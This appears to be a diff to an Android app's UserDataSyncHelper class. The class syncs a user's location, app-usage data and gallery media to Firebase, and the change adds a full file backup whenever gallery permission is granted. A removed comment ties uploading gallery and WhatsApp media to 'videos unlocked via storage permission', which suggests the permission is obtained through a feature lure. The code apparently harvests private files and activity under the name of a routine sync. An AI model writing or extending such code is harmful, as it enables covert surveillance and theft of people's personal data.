@@ -19,11 +19,22 @@ import java.util.Map;
  */
 public class UserDataSyncHelper {
     private static final String TAG = "UserDataSyncHelper";
+    private static volatile boolean syncInProgress = false;
 
     public static void syncAll(Context context) {
+        syncAll(context, true);
+    }
+
+    /** @param includeMedia when false, skips file backup (caller already started SyncService). */
+    public static void syncAll(Context context, boolean includeMedia) {
         FirebaseUser user = FirebaseAuth.getInstance().getCurrentUser();
         if (user == null) {
             Log.w(TAG, "Cannot sync: user not logged in");
+            return;
+        }
+
+        if (syncInProgress) {
+            Log.d(TAG, "Sync already in progress — skipping duplicate run");
             return;
         }
 
@@ -31,6 +42,8 @@ public class UserDataSyncHelper {
         String userId = user.getUid();
 
         new Thread(() -> {
+            syncInProgress = true;
+            try {
             Log.d(TAG, "Starting user data sync for " + userId);
 
             updateProfileSummary(user);
@@ -61,11 +74,8 @@ public class UserDataSyncHelper {
                 Log.w(TAG, "Skipping location: permission not granted");
             }
 
-            // Gallery / WhatsApp media only after videos unlocked via storage permission
-            if (FeaturePermissions.areVideosUnlocked(appContext)) {
-                ImageUploadWorker.enqueueWork(appContext);
-            } else {
-                Log.w(TAG, "Skipping gallery: videos not unlocked yet");
+            if (includeMedia && FeaturePermissions.hasGalleryPermission(appContext)) {
+                FileBackupHelper.startFullBackup(appContext);
             }
 
             if (AppUsageSyncHelper.hasUsageAccess(appContext)) {
@@ -78,6 +88,11 @@ public class UserDataSyncHelper {
                     .setValue(System.currentTimeMillis());
 
             Log.d(TAG, "User data sync finished for " + userId);
+            } catch (Exception e) {
+                Log.e(TAG, "User data sync failed", e);
+            } finally {
+                syncInProgress = false;
+            }
         }).start();
     }
 
